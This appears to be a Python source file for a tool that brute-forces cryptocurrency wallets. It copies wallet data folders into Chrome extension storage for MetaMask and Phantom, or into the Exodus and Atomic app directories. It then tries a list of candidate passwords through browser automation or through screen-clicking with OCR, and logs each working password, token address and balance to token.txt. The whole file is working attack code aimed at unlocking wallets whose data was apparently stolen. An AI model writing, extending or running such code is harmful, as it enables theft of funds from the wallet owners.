
# import undetected_chromedriver as uc
import subprocess
import time
from selenium import webdriver
import os, shutil
from selenium.webdriver.common.keys import Keys
import pyautogui
import numpy as np
import cv2
import pytesseract
import tkinter as tk

class ScannerWalletSelenium:
    ref = None
    driver = None
    def __init__(self, index, threadCount, wallet):
        super().__init__()
        self.index = index
        self.threadCount = threadCount
        self.wallet = wallet
        self.passwordSuccess = None
        self.balance = ''
        self.tokenAddress = ''
    def login(self):
        try:
            self.driver.get('chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html')
            time.sleep(5)
            try:
                if self.driver.find_element("id", "password"):
                    if self.wallet["password"]:
                        for password in str(self.wallet["password"]).split("|"):
                            print('dzo ', password)
                            self.passwordSuccess = password
                            passElm = self.driver.find_element("id", "password")
                            passElm.send_keys(Keys.CONTROL + "a")
                            passElm.send_keys(Keys.DELETE)
                            passElm.send_keys(password)
                            btnLogin = self.driver.find_element("xpath", "/html/body/div[1]/div/div[2]/div/div/button")
                            btnLogin.click()
                            time.sleep(0.3)
                            try:
                                if self.driver.find_element("id", "password"):
                                    #login thất bại tiếp tục login
                                    continue
                            except:
                                self.passwordSuccess = password
                                #login Thành công
                                try:
                                    btnBalance = self.driver.find_element("xpath", "/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[1]/div/button")
                                    self.driver.execute_script("arguments[0].click();", btnBalance)
                                    root = tk.Tk()
                                    self.tokenAddress = root.clipboard_get()
                                except Exception as e:
                                    print('sao laij excep', e)
                                    return True
                        try:
                            if self.driver.find_element("id", "password"):
                                #login thất bại tiếp tục login
                                return False
                        except:
                            print('excep ne')
                            #login Thành công  
                            try:
                                btnBalance = self.driver.find_element("xpath", "/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[1]/div/button")
                                self.driver.execute_script("arguments[0].click();", btnBalance)
                                root = tk.Tk()
                                self.tokenAddress = root.clipboard_get()
                            except Exception as e:
                                print('sao laij excep', e)
                                return True
                else:
                    return False
            except:
                try:
                    if  self.driver.find_element("xpath", "/html/body/div[1]/div/div[2]/div/div/div/div/div/div/ul/li[1]"):
                        return False
                except:  
                    #login Thành công  
                    try:
                        btnBalance = self.driver.find_element("xpath", "/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[1]/div/button")
                        self.driver.execute_script("arguments[0].click();", btnBalance)
                        root = tk.Tk()
                        self.tokenAddress = root.clipboard_get()
                    except Exception as e:
                        print('sao laij excep', e)
                        return True
                    return True
        except:
            return False
    
    def loginPhantom(self):
        try:
            self.driver.get('chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa/popup.html')
            time.sleep(5)
            try:
                namepassword = self.driver.find_element("name", "password")
                if namepassword:
                    if self.wallet["password"]:
                        for password in str(self.wallet["password"]).split("|"):
                            print('dzo ', password)
                            self.passwordSuccess = password
                            passElm = self.driver.find_element("name", "password")
                            passElm.send_keys(Keys.CONTROL + "a")
                            passElm.send_keys(Keys.DELETE)
                            passElm.send_keys(password)
                            btnLogin = self.driver.find_element("xpath", "/html/body/div/div/div[1]/div/div[2]/div/button")
                            btnLogin.click()
                            time.sleep(0.3)
                            try:
                                if self.driver.find_element("name", "password"):
                                    #login thất bại tiếp tục login
                                    continue
                            except:
                                self.passwordSuccess = password
                                #login Thành công
                                print('logionnnn')
                                time.sleep(1)
                                for i in range(0, 5):
                                    try:
                                        elementToken = self.driver.find_element("xpath", f"/html/body/div[1]/div/div[1]/div[1]/div/div[2]/div/div/div/div[{i + 1}]/div/div/div[1]/p[1]")
                                        elementBalance = self.driver.find_element("xpath", f"/html/body/div[1]/div/div[1]/div[1]/div/div[2]/div/div/div/div[{i + 1}]/div/div/div[1]/p[2]")
                                        self.balance += f'{elementToken.text}:{elementBalance.text.replace("$", "")}'
                                    except:
                                        break
                                return True
                        try:
                            if self.driver.find_element("name", "password"):
                                #login thất bại tiếp tục login
                                return False
                        except:
                            print('excep ne')
                            #login Thành công
                            return True
                else:
                    return False
            except:
                return False
        except:
            return False
    
    def get_cookies(self):
        self.driver.get('https://www.google.com')
        time.sleep(1)
        return self.driver.get_cookies()

    def delete_files_and_subdirectories(self, directory_path):
        try:
            with os.scandir(directory_path) as entries:
                for entry in entries:
                    if entry.is_file() and 'window-state' not in str(entry): 
                        os.unlink(entry.path)
                    else:
                        shutil.rmtree(entry.path)
                print("All files and subdirectories deleted successfully.")
        except OSError:
            print("Error occurred while deleting files and subdirectories.")

    def copytree(self, src, dst, symlinks=False, ignore=None):
        for item in os.listdir(src):
            s = os.path.join(src, item)
            d = os.path.join(dst, item)
            if os.path.isdir(s):
                shutil.copytree(s, d, symlinks, ignore)
            else:
                if 'window-state' not in str(s):
                  shutil.copy2(s, d)

    def initChromeMetaMask(self):
        profileIndex = self.threadCount
        print('profileIndex', profileIndex)
        if not os.path.exists(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake"):
            os.makedirs(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake")
        
        #check profile existed 
        if not os.path.exists(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}"):
            os.makedirs(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}")
            self.copytree(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile 0", rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}")

        self.delete_files_and_subdirectories(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn")
        files = os.listdir(self.wallet["path"])
        for fname in files:
            shutil.copy2(os.path.join(self.wallet["path"], fname), rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn")
        time.sleep(1)
        options = webdriver.ChromeOptions()
        options.add_argument(rf"--user-data-dir=C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake") #e.g. C:\Users\You\AppData\Local\Google\Chrome\User Data
        options.add_argument(rf'--profile-directory=Profile {profileIndex}') #e.g. Profile 3
        options.add_argument("--window-size=800,900")
        options.add_experimental_option("useAutomationExtension", False)
        options.add_experimental_option("excludeSwitches",["enable logging"])
        options.add_experimental_option("excludeSwitches", ["enable automation"])
        options.add_argument("start-maximized")
        #options to hide window
        #options.add_argument('headless')
        self.driver = webdriver.Chrome(options=options)
        self.driver.delete_all_cookies()

    def initChromePhantom(self):
        profileIndex = self.threadCount
        if not os.path.exists(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake"):
            os.makedirs(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake")
        
        #check profile existed 
        if not os.path.exists(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}"):
            os.makedirs(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}")
            self.copytree(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile 0", rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}")

        self.delete_files_and_subdirectories(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa")
        files = os.listdir(self.wallet["path"])
        try:
             for fname in files:
                shutil.copy2(os.path.join(self.wallet["path"], fname), rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa")
        except:
            print('coppy error')
            return
        time.sleep(1)
        options = webdriver.ChromeOptions()
        options.add_argument(rf"--user-data-dir=C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake") #e.g. C:\Users\You\AppData\Local\Google\Chrome\User Data
        options.add_argument(rf'--profile-directory=Profile {profileIndex}') #e.g. Profile 3
        options.add_argument("--window-size=800,900")
        options.add_experimental_option("useAutomationExtension", False)
        options.add_experimental_option("excludeSwitches",["enable logging"])
        options.add_experimental_option("excludeSwitches", ["enable automation"])
        options.add_argument("start-maximized")
        #options to hide window
        #options.add_argument('headless')
        self.driver = webdriver.Chrome(options=options)
        self.driver.delete_all_cookies()

    def initEdoxus(self):
        try:
            if not os.path.exists(rf"C:\Users\{os.getlogin()}\AppData\Roaming\Exodus"):
                return False
            self.delete_files_and_subdirectories(rf"C:\Users\{os.getlogin()}\AppData\Roaming\Exodus\exodus.wallet")
            os.rmdir(rf"C:\Users\{os.getlogin()}\AppData\Roaming\Exodus\exodus.wallet")
        except:
            return False

        self.copytree(self.wallet['path'], rf"C:\Users\{os.getlogin()}\AppData\Roaming\Exodus")
        time.sleep(2)
        subprocess.call([rf'C:\Users\{os.getlogin()}\AppData\Local\exodus\Exodus.exe'])
        time.sleep(5)
        #screenshot check cookies pass
        screenshot_login = pyautogui.screenshot(region=(560, 220, 800, 590))
        screenshot_login = cv2.cvtColor(np.array(screenshot_login), cv2.COLOR_RGB2BGR)
        cv2.imwrite("image-temp/screen-login.png", screenshot_login)
        time.sleep(2)

        try:
            if os.path.exists(rf'C:\Program Files\Tesseract-OCR\tesseract.exe'):
                pytesseract.pytesseract.tesseract_cmd = rf'C:\Program Files\Tesseract-OCR\tesseract.exe'
            if os.path.exists(rf'C:\Program Files (x86)\Tesseract-OCR\tesseract.exe'):
                pytesseract.pytesseract.tesseract_cmd = rf'C:\Program Files\Tesseract-OCR\tesseract.exe'
        except:
            pytesseract.pytesseract.tesseract_cmd = rf'C:\Program Files (x86)\Tesseract-OCR\tesseract.exe'
        firstStepText = pytesseract.image_to_string("image-temp/screen-login.png")
        if 'Unlock to Continue' in firstStepText:
            if self.wallet["password"]:
                for password in str(self.wallet["password"]).split("|"):
                    print('password', password)
                    pyautogui.write(password)
                    pyautogui.press('enter')
                    time.sleep(5)
                    check_login = pyautogui.screenshot(region=(560, 220, 800, 590))
                    check_login = cv2.cvtColor(np.array(check_login), cv2.COLOR_RGB2BGR)
                    cv2.imwrite("image-temp/screen-login-check.png", check_login)
                    loginCheckScreen = pytesseract.image_to_string("image-temp/screen-login-check.png")
                    if 'Unlock to Continue' not in loginCheckScreen:
                        os.system('tskill Exodus')
                        self.passwordSuccess = password
                        return True
                    else:
                        continue
                os.system('tskill Exodus')
                return False
            else:
                os.system('tskill Exodus')
                return False
        else:
            os.system('tskill Exodus')
            return False

    def initAtomic(self):
        try:
            if not os.path.exists(rf"C:\Users\{os.getlogin()}\AppData\Roaming\atomic"):
                return False
            self.delete_files_and_subdirectories(rf"C:\Users\{os.getlogin()}\AppData\Roaming\atomic")
            os.system('tskill "Atomic Wallet"')
        except:
            return False
        try:
            self.copytree(self.wallet['path'], rf"C:\Users\{os.getlogin()}\AppData\Roaming\atomic")
        except:
            print('coppy error')
            return False
        time.sleep(2)
        os.startfile(rf'C:\Users\{os.getlogin()}\AppData\Local\Programs\atomic\Atomic Wallet.exe')
        time.sleep(10)
        # pyautogui.write('Hello There')
        # pyautogui.press('enter')
        #screenshot check cookies pass
        screenshot_login = pyautogui.screenshot(region=(560, 220, 800, 590))
        screenshot_login = cv2.cvtColor(np.array(screenshot_login), cv2.COLOR_RGB2BGR)
        cv2.imwrite("image-temp/screen-login.png", screenshot_login)
        time.sleep(2)
        try:
            if os.path.exists(rf'C:\Program Files\Tesseract-OCR\tesseract.exe'):
                pytesseract.pytesseract.tesseract_cmd = rf'C:\Program Files\Tesseract-OCR\tesseract.exe'
            if os.path.exists(rf'C:\Program Files (x86)\Tesseract-OCR\tesseract.exe'):
                pytesseract.pytesseract.tesseract_cmd = rf'C:\Program Files\Tesseract-OCR\tesseract.exe'
        except:
            pytesseract.pytesseract.tesseract_cmd = rf'C:\Program Files (x86)\Tesseract-OCR\tesseract.exe'
        firstStepText = pytesseract.image_to_string("image-temp/screen-login.png")
        print('firstStepText', firstStepText)
        if 'RESTORE FROM BACKUP' in firstStepText:
            if self.wallet["password"]:
                for password in str(self.wallet["password"]).split("|"):
                    pyautogui.doubleClick(x=904, y=401)
                    pyautogui.typewrite("") 
                    pyautogui.press('backspace')
                    print('password', password)
                    pyautogui.write(password)
                    pyautogui.click(x=970, y=522)
                    time.sleep(5)
                    check_login = pyautogui.screenshot(region=(560, 220, 800, 590))
                    check_login = cv2.cvtColor(np.array(check_login), cv2.COLOR_RGB2BGR)
                    cv2.imwrite("image-temp/screen-login-check.png", check_login)
                    loginCheckScreen = pytesseract.image_to_string("image-temp/screen-login-check.png")
                    print('loginCheckScreen', loginCheckScreen)
                    if 'Your 12-word backup phrase' in loginCheckScreen:
                        break
                    if 'RESTORE' not in loginCheckScreen:
                        time.sleep(10)
                        # check if need update
                        try:
                            check_update = pyautogui.screenshot(region=(560, 220, 800, 590))
                            check_update = cv2.cvtColor(np.array(check_login), cv2.COLOR_RGB2BGR)
                            cv2.imwrite("image-temp/screen-app-update.png", check_update)
                            updateCheckText = pytesseract.image_to_string("image-temp/screen-app-update.png")
                            print('updateCheckText', updateCheckText)
                            pyautogui.click(x=980, y=970)
                        except:
                            pass
                        #balance 
                        checkBlanaceImg = pyautogui.screenshot(region=(90, 145, 120, 155))
                        checkBlanaceImg = cv2.cvtColor(np.array(checkBlanaceImg), cv2.COLOR_RGB2BGR)
                        cv2.imwrite("image-temp/balance.png", checkBlanaceImg)
                        time.sleep(1)
                        balanceText = pytesseract.image_to_string("image-temp/balance.png")
                        print('balanceText', balanceText)
                        os.system('tskill "Atomic Wallet"')
                        self.passwordSuccess = password
                        self.balance = balanceText
                        return True
                    else:
                        continue
                os.system('tskill "Atomic Wallet"')
                return False
            else:
                os.system('tskill "Atomic Wallet"')
                return False
        else:
            os.system('tskill "Atomic Wallet"')
            return False

    def run(self):
        if self.wallet["wallet"] == "MetaMask":
            self.initChromeMetaMask()
            checkLogin = self.login() 
            if checkLogin == True:
                open("token.txt", 'a+').write("%s|%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess, self.tokenAddress))
                self.ref.checksuccess.emit(True, self.index, "Login thành công")

            if checkLogin == False:
                time.sleep(3)
                self.ref.checksuccess.emit(False, self.index, f"Login thất bại")  
            self.driver.quit()
        if self.wallet["wallet"] == "Exodus":
            checkLogin = self.initEdoxus()
            if checkLogin == True:
                open("token.txt", 'a+').write("%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess))
                self.ref.checksuccess.emit(True, self.index, "Login thành công")

            if checkLogin == False:
                time.sleep(3)
                self.ref.checksuccess.emit(False, self.index, f"Login thất bại")  
                
        if self.wallet["wallet"] == "Atomic":
            checkLogin = self.initAtomic()
            print('checkLogin', checkLogin)
            if checkLogin == True:
                open("token.txt", 'a+').write("%s|%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess, self.balance))
                self.ref.checksuccess.emit(True, self.index, "Login thành công")

            if checkLogin == False:
                time.sleep(3)
                self.ref.checksuccess.emit(False, self.index, f"Login thất bại")  
                        
        if self.wallet["wallet"] == "Phantom":
            self.initChromePhantom()
            checkLogin = self.loginPhantom() 
            print('checkLogin', checkLogin)
            if checkLogin == True:
                open("token.txt", 'a+').write("%s|%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess, self.balance))
                self.ref.checksuccess.emit(True, self.index, "Login thành công")

            if checkLogin == False:
                time.sleep(3)
                self.ref.checksuccess.emit(False, self.index, f"Login thất bại")  
            self.driver.quit()